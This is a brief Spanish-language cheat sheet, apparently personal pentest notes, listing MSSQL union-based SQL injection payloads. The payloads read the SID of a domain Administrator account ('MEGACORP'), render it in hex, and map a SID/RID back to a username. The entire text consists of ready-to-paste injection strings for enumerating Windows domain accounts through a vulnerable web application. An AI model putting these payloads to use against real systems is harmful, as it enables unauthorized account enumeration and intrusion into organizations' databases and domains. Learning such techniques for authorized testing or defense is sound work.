# MSSQL

## Obtener suma RID + SID

```null
test' union select 1,SUSER_SID('MEGACORP\Administrator'),3,4,5-- -
```

#### Para representarla en hexadecimal

```null
test' union select 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator')),3,4,5-- -
```

## Obtención de usuario a partir de RID + SID

```null
test' union select 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5-- -
```


